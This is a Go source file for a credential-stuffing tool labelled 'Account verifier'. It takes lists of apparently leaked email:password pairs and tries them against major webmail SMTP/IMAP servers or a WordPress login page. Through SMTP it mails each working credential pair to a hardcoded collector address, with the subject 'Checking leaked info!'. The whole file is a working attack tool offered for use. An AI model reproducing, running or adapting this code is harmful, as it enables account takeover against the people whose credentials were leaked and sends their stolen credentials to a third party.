package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"

	"github.com/emersion/go-imap/client" // run this before execute at the first time to download the package : go get github.com/emersion/go-imap/client
	"github.com/emersion/go-sasl"        // go get github.com/emersion/go-sasl
	"github.com/emersion/go-smtp"        // go get github.com/emersion/go-smtp
	"github.com/fatih/color"             // go get github.com/fatih/color
	"golang.org/x/net/publicsuffix"      // go get golang.org/x/net/publicsuffix
)

var (
	data      []string
	server    string
	delimiter = ":" //default delimiter
	filter    string
	mode      = "smtp" // default mode (smtp/wordpress)
	SMTPport  = "587"  // default smtp port
	IMAPport  = "993"
	myemail   = "anon@google.com" // change this to your email
)

func main() {
	for i := range os.Args {
		if os.Args[i] == "-f" {
			data = readFile(os.Args[i+1])
		} else if os.Args[i] == "-s" {
			server = os.Args[i+1]
		} else if os.Args[i] == "-pi" {
			IMAPport = os.Args[i+1]
		} else if os.Args[i] == "-ps" {
			SMTPport = os.Args[i+1]
		} else if os.Args[i] == "-d" {
			delimiter = os.Args[i+1]
		} else if os.Args[i] == "-x" {
			filter = os.Args[i+1]
		} else if os.Args[i] == "-m" {
			mode = os.Args[i+1]
		}
	}

	if data == nil {
		help()
	}

	for i, x := range data {
		d := strings.Split(x, delimiter)
		if len(d) == 2 {
			fmt.Println("[" + strconv.Itoa(i) + "] " + d[0] + ":" + d[1])
			if mode == "wordpress" {
				wordpress(server, d[0], d[1])
			} else if mode == "smtp" || mode == "imap" {
				checkMail(d[0], d[1])
			}
		}
	}
}

func help() {
	fmt.Println("Account verifier")
	fmt.Println("Usage: ")
	fmt.Println("\t-s\t\t- Define Custom SMTP server.")
	fmt.Println("\t\t\t    If the value is empty, it will check based on email domain.")
	fmt.Println("\t\t\t    Support: gmail,yahoo,aol,hotmail,icloud,outlook")
	fmt.Println("\t-x\t\t- Checking for specific domain (separated by comma)")
	fmt.Println("\t\t\t    Support: gmail,yahoo,aol,hotmail,icloud,outlook")
	fmt.Println("\t-f\t\t- Define list of email password to check.")
	fmt.Println("\t-p\t\t- Define SMTP port (default: 587).")
	fmt.Println("\t-d\t\t- Define delimiter for email & password. (default is ':')'")
	fmt.Println("\t-m\t\t- Mode can be 'smtp' or 'wordpress'. (default: smtp)")
	fmt.Println("\t\t\t    When using wordpress mode, server must be a url with scheme.\n")
	fmt.Println("Example 1 : " + os.Args[0] + " -s smtp.example.com -p 587 -f lists.txt -d '|'")
	fmt.Println("Example 2 : " + os.Args[0] + " -f lists.txt -d '|'")
	fmt.Println("Example 3 : " + os.Args[0] + " -f lists.txt -d '|' -x aol,gmail,icloud")
	fmt.Println("Example 4 : " + os.Args[0] + " -f lists.txt -d '|' -s https://target.com -m wordpress")
}

func checkMail(username string, password string) {
	if server == "" {
		checkSMTPMail(username, password)
	} else if server != "" && mode == "smtp" {
		fmt.Println("[SMTP] " + username + ":" + password)
		auth := sasl.NewPlainClient("", username, password)
		to := []string{myemail}
		msg := strings.NewReader("To: " + myemail + "\r\nSubject: Checking leaked info!\r\n\r\n" + username + ":" + password + "\r\n")
		err := smtp.SendMail(server+":"+SMTPport, auth, username, to, msg)
		if err != nil {
			checkErrorLogin(err.Error())
		} else {
			color.Green("STATUS: Logged In!!")
		}
	} else if server != "" && mode == "imap" {
		c, err := client.DialTLS(server+":"+IMAPport, nil)
		if err != nil {
			log.Fatal(err)
		}
		defer c.Logout()

		if err := c.Login(username, password); err != nil {
			checkErrorLogin(err.Error())
		} else {
			color.Green("STATUS: Logged in")
		}
	}
}

func checkSMTPMail(username string, password string) {
	var cserver string
	if strings.Contains(username, "@gmail") && checkFilter(filter, []string{"gmail", "googlemail"}) {
		cserver = "smtp.gmail.com:587"
	} else if strings.Contains(username, "@yahoo") && checkFilter(filter, []string{"yahoo", "rocketmail"}) {
		cserver = "smtp.mail.yahoo.com:587"
	} else if strings.Contains(username, "@live") && checkFilter(filter, []string{"live"}) {
		cserver = "smtp.live.com:587"
	} else if strings.Contains(username, "@outlook") && checkFilter(filter, []string{"outlook"}) {
		cserver = "smtp-mail.outlook.com:587"
	} else if strings.Contains(username, "@icloud") && checkFilter(filter, []string{"icloud"}) {
		cserver = "smtp.mail.me.com:587"
	} else if strings.Contains(username, "@aol") && checkFilter(filter, []string{"aol"}) {
		cserver = "smtp.aol.com:587"
	} else {
		return
	}

	auth := sasl.NewPlainClient("", username, password)
	to := []string{myemail}
	msg := strings.NewReader("To: " + myemail + "\r\nSubject: Checking leaked info!\r\n\r\n" + username + ":" + password + "\r\n")
	err := smtp.SendMail(cserver, auth, username, to, msg)
	if err != nil {
		checkErrorLogin(err.Error())
	} else {
		color.Green("STATUS: Logged in")
	}
}

func checkIMAPMail(username string, password string) {
	var cserver string
	if strings.Contains(username, "@gmail") && checkFilter(filter, []string{"gmail", "googlemail"}) {
		cserver = "imap.gmail.com:993"
	} else if strings.Contains(username, "@yahoo") && checkFilter(filter, []string{"yahoo", "rocketmail"}) {
		cserver = "imap.mail.yahoo.com:993"
	} else if strings.Contains(username, "@live") && checkFilter(filter, []string{"live", "outlook"}) {
		cserver = "imap-mail.outlook.com:993"
	} else if strings.Contains(username, "@icloud") && checkFilter(filter, []string{"icloud"}) {
		cserver = "imap.mail.me.com:993"
	} else if strings.Contains(username, "@aol") && checkFilter(filter, []string{"aol"}) {
		cserver = "imap.aol.com:993"
	} else {
		return
	}

	c, err := client.DialTLS(cserver, nil)
	if err != nil {
		log.Fatal(err)
	}
	defer c.Logout()

	if err := c.Login(username, password); err != nil {
		checkErrorLogin(err.Error())
	} else {
		color.Green("STATUS: Logged in")
	}
}

func wordpress(target string, username string, password string) {
	fmt.Println("[WORDPRESS] " + username + ":" + password)
	options := cookiejar.Options{
		PublicSuffixList: publicsuffix.List,
	}
	jar, err := cookiejar.New(&options)
	if err != nil {
		log.Fatal(err)
	}
	client := http.Client{Jar: jar}
	resp, err := client.Get(target + "/wp-login.php")
	if err != nil {
		fmt.Println(err)
	}
	resp, err = client.PostForm(target+"/wp-login.php", url.Values{
		"log":         {username},
		"pwd":         {password},
		"rememberme":  {"forever"},
		"wp-submit":   {"Log In"},
		"redirect_to": {target + "/wp-admin/"},
		"testcookie":  {"1"},
	})
	if err != nil {
		log.Fatal(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		log.Fatal(err)
	}
	if !strings.Contains(string(data), "<div id=\"login_error\">") {
		color.Green("STATUS: Logged In!!")
	} else {
		fmt.Println("Error: Incorrect login.")
	}
}

func checkErrorLogin(err string) {
	if strings.Contains(err, "Please log in with your web browser and then try again") {
		color.HiGreen("Need to check manually!")
	} else if strings.Contains(err, "Web login required") {
		color.HiGreen("Web login required!")
	} else if strings.Contains(err, "Invalid credentials") {
		fmt.Println("Invalid credentials")
	} else {
		fmt.Println(err)
	}
}

func checkFilter(filter string, domains []string) bool {
	for _, x := range domains {
		if filter != "" {
			if strings.Contains(filter, x) {
				return true
			}
		}
	}
	return false
}

func readFile(file string) []string {
	dat, err := ioutil.ReadFile(file)
	if err != nil {
		panic("File " + file + " not found!\n" + err.Error())
	}
	data := strings.Split(strings.Trim(string(dat), "\r"), "\n")
	return data
}
